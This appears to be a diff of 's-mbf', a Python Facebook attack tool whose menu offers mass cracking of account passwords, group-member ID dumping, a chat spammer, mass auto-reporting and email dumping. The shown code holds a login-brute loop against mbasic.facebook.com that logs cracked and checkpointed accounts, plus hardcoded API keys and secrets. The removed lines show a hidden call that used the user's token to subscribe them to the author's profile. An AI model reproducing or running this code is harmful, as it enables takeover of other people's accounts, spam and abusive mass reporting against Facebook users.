@@ -6,6 +6,7 @@ try:
 	from multiprocessing.pool import ThreadPool
 	from crayons import *
 	from src import DOS
+	from getpass import getpass
 	import os, requests, sys, json, time, hashlib, random, shutil
 except Exception as F:
 	exit("[ModuleErr] %s"%(F))
@@ -23,7 +24,7 @@ def banner():
 	print(cyan('   _____ __  ______  ____',bold=True))
 	print(cyan('  / __(_)  |/  / _ )/ __/ ',bold=True),green('Author : KANG-NEWBIE',bold=True))
 	print(cyan(' _\ \/ / /|_/ / _  / _/	  ',bold=True),green('Contact: t.me/kang_nuubi',bold=True))
-	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('1.5',bold=True))
+	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('1.6',bold=True))
 
 try:
 	toket=open('toket/token.txt')
@@ -36,7 +37,7 @@ except IOError:
 			try:
 				os.mkdir('toket')
 			except OSError: pass
-			print('[!] login to your facebook account first');id = input('[?] Username : ');pwd = input('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
+			print('\n[!] login to your facebook account first');id = input('[?] Username : ');pwd = getpass('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
 			x = hashlib.new('md5')
 			x.update(sig)
 			data.update({'sig':x.hexdigest()})
@@ -85,28 +86,36 @@ def getGid():
 	try:
 		os.mkdir('dump')
 	except OSError: pass
-	try:
-		id=input("\n[in] your groups id: ")
-		b=open('dump/group_'+id+'_id.txt','w')
-		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=id&limit=999999999&access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
-		s=json.loads(re.text)
-		for i in s['data']:
-			b.write(i['id'] + '\n')
-			print('\r[*] %s retrieved	'%(i['id']),end=''),;sys.stdout.flush();time.sleep(0.0001)
-		print('\n[!] group members id successfuly retreived')
-		print("[!] file saved: dump/group_%s_id.txt"%(id))
-		b.close()
-		exit()
+	class dumps:
+		def __init__(self):
+			self.req=requests.Session()
+			self.id=input("\n[in] your groups id: ")
+			self.b=open('dump/group_'+self.id+'_id.txt','w')
+			self.dum(f"https://graph.facebook.com/{self.id}/members?fields=id&limit=999999999&access_token={str(toket)}")
+		
+		def dum(self,idi):
+			self.re=self.req.get(idi).json()
+			for i in self.re['data']:
+				self.b.write(i['id'] + '\n')
+				c=open('dump/group_'+self.id+'_id.txt').readlines()
+				print('\r[%s] %s retrieved	'%(len(c),i['id']),end=''),;sys.stdout.flush();time.sleep(0.000000001)
+
+			try:
+				self.dum(self.re["paging"]["next"])
+			except:
+				print('\n[!] all group id successfuly retreived')
+				print("[!] file saved: dump/group_%s_id.txt"%(self.id))
+				exit()
+	try:			
+		dumps()
 	except (KeyboardInterrupt,EOFError):
 		exit("[!] Key interrupt: Stoped.")
-	except KeyError:
-		os.remove('dump/group_'+str(id)+'_id.txt')
-		exit('[!] failed to fetch group id')
 
 def rmtoken():
 	print("""
 1. remove access token
 2. remove cookies
+3. remove access token & cookies
 """)
 	pilihan=int(input("/kang-newbie_> "))
 	if pilihan == 1:
@@ -114,7 +123,7 @@ def rmtoken():
 		if ques == 'n' or ques == 'N':
 			exit("[!] Canceling")
 		elif ques == 'y' or ques == 'Y':
-			os.remove('toket/token.txt');os.remove('toket/kue.txt')
+			os.remove('toket/token.txt')
 			exit("[!] success removed access token")
 		else: exit("[!] wrong input: exit")
 	elif pilihan == 2:
@@ -126,6 +135,15 @@ def rmtoken():
 				os.remove('toket/kue.txt')
 			except FileNotFoundError: exit("[?] cookies not found")
 			exit("[!] success removed cookies")
+		else: exit("[!] wrong input: exit")
+	elif pilihan == 3:
+		ques=input("\n[?] are you sure (y/n) ")
+		if ques == 'n' or ques == 'N':
+			exit("[!] Canceling")
+		elif ques == 'y' or ques == 'Y':
+			os.remove('toket/token.txt')
+			os.remove('toket/kue.txt')
+			exit("[!] success removed access token & cookies")
 		else: exit("[!] wrong input: exit")
 	else: exit("[exit] wrong input")
 
@@ -146,8 +164,8 @@ def main(arg):
         try:
                 url='https://mbasic.facebook.com/login'
                 dt={'email':arg,'pass':pas,'login':'submit'}
-#                head={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
-                req=requests.post(url,data=dt)
+                head={'User-Agent':'Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18'}
+                req=requests.post(url,data=dt,headers=head)
                 respData = req.content
                 if 'save-device' in str(respData) or 'm_sess' in str(respData):
                         true='yeah'
@@ -174,7 +192,7 @@ def main(arg):
                         f.write(wrt)
                         f.close()
                 crk.append(arg)
-                print("\r[ CRACK ] >> %s/%s F[%s] CP[%s] <<    "%(len(crk),len(o),len(tap),len(cek)),end=''),;sys.stdout.flush()
+                print("\r[ CRACK ] >> %s/%s F[%s] CP[%s] <<"%(len(crk),len(o),len(tap),len(cek)),end=''),;sys.stdout.flush()
         except: pass
 
 DOS.Dos()
@@ -184,7 +202,7 @@ try:
 	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket)
 	name=nam.json()['name']
 
-	upver='v.1.6'
+	upver='v.1.7'
 	requp=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
 	if upver in str(requp):
 		print(yellow('\nNew version available. update your s-mbf now!'))
@@ -200,21 +218,22 @@ try:
 [03]> Dump id from your group
 [04]> Dump id with search name
 [05]> Remove access token/cookies
-[06]> Facebook home comments
-[07]> Mass group comment
-[08]> Auto comments target
-[09]> Auto react comments target
-[10]> Accept all friends requests
-[11]> Auto add friends from target id
-[12]> Facebook auto unfriends
-[13]> Mass auto reactions
-[14]> Mass auto follow
-[15]> Facebook chat spammer
+[06]> Accept all friends requests
+[07]> Add friends from target id
+[08]> React comments target
+[09]> Home comments
+[10]> Group comment
+[11]> Comments target
+[12]> Auto unfriends
+[13]> Auto reactions
+[14]> Auto follow
+[15]> Chat spammer
 [16]> Auto posting status
-[17]> Mass Auto Report
-[18]> Facebook dump email
-[19]> Facebook check apps
-[20]> Multi bruteforce EMAIL (BETA)
+[17]> Auto Reporting
+[18]> Dump email
+[19]> Check bind apps
+[20]> Deleted post
+[21]> Checker accounts
 [00]> Check update""")
 except (KeyError,NameError): pass
 
@@ -233,27 +252,27 @@ elif pilih == 5:
 	rmtoken()
 elif pilih == 6:
 	DOS.Dos()
-	import src.komen
+	import src.Facc
 	exit()
 elif pilih == 7:
 	DOS.Dos()
-	import src.Gkomen
+	import src.Fadd
 	exit()
 elif pilih == 8:
 	DOS.Dos()
-	import src.Tkomen
+	import src.Kreact
 	exit()
 elif pilih == 9:
 	DOS.Dos()
-	import src.Kreact
+	import src.komen
 	exit()
 elif pilih == 10:
 	DOS.Dos()
-	import src.Facc
+	import src.Gkomen
 	exit()
 elif pilih == 11:
 	DOS.Dos()
-	import src.Fadd
+	import src.Tkomen
 	exit()
 elif pilih == 12:
 	DOS.Dos()
@@ -291,7 +310,11 @@ elif pilih == 19:
 	exit()
 elif pilih == 20:
 	DOS.Dos()
-	import src.Ebrute
+	import src.Delpos
+	exit()
+elif pilih == 21:
+	DOS.Dos()
+	import src.Cekun
 	exit()
 elif pilih == 0:
 	print("\n[!] Checking update")
